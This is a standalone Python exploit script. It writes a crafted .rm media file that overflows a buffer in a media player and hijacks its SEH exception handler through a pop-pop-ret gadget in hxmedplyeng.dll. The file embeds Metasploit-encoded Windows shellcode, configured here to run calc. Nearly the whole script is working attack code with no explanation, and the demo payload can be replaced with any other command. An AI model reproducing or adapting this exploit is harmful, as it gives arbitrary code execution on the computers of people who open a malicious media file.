#!/usr/bin/env python
import struct

# windows/exec - 196 bytes
# http://www.metasploit.com
# VERBOSE=false, PrependMigrate=false, EXITFUNC=process,
# CMD=calc
# x86/shikata_ga_nai succeeded with size 223 (iteration=1)
payload = ""
payload += "\xda\xda\xb8\x24\x14\x3a\x44\xd9\x74\x24\xf4\x5d\x29"
payload += "\xc9\xb1\x32\x83\xc5\x04\x31\x45\x13\x03\x61\x07\xd8"
payload += "\xb1\x95\xcf\x95\x3a\x65\x10\xc6\xb3\x80\x21\xd4\xa0"
payload += "\xc1\x10\xe8\xa3\x87\x98\x83\xe6\x33\x2a\xe1\x2e\x34"
payload += "\x9b\x4c\x09\x7b\x1c\x61\x95\xd7\xde\xe3\x69\x25\x33"
payload += "\xc4\x50\xe6\x46\x05\x94\x1a\xa8\x57\x4d\x51\x1b\x48"
payload += "\xfa\x27\xa0\x69\x2c\x2c\x98\x11\x49\xf2\x6d\xa8\x50"
payload += "\x22\xdd\xa7\x1b\xda\x55\xef\xbb\xdb\xba\xf3\x80\x92"
payload += "\xb7\xc0\x73\x25\x1e\x19\x7b\x14\x5e\xf6\x42\x99\x53"
payload += "\x06\x82\x1d\x8c\x7d\xf8\x5e\x31\x86\x3b\x1d\xed\x03"
payload += "\xde\x85\x66\xb3\x3a\x34\xaa\x22\xc8\x3a\x07\x20\x96"
payload += "\x5e\x96\xe5\xac\x5a\x13\x08\x63\xeb\x67\x2f\xa7\xb0"
payload += "\x3c\x4e\xfe\x1c\x92\x6f\xe0\xf8\x4b\xca\x6a\xea\x98"
payload += "\x6c\x31\x60\x5e\xfc\x4f\xcd\x60\xfe\x4f\x7d\x09\xcf"
payload += "\xc4\x12\x4e\xd0\x0e\x57\xa0\x9a\x13\xf1\x29\x43\xc6"
payload += "\x40\x34\x74\x3c\x86\x41\xf7\xb5\x76\xb6\xe7\xbf\x73"
payload += "\xf2\xaf\x2c\x09\x6b\x5a\x53\xbe\x8c\x4f\x30\x21\x1f"
payload += "\x13\xb7"

content = '[InternetShortcut]\nURL='
junk = 'A' * 2312
# x86 jmp 0x06 + NOPs
nseh = struct.pack('<L', 0x909006EB)
# pop ecx # pop ecx # ret  |  {PAGE_EXECUTE_READ} [hxmedplyeng.dll]
sehhandler = struct.pack('<L', 0x63c48035)
pad = 'B' * 5000  # trigger exception by overflowing stack region

xpl = content + junk + nseh + sehhandler + payload + pad

with open('xpl-5.rm', 'wb') as fd:
    fd.write(xpl)
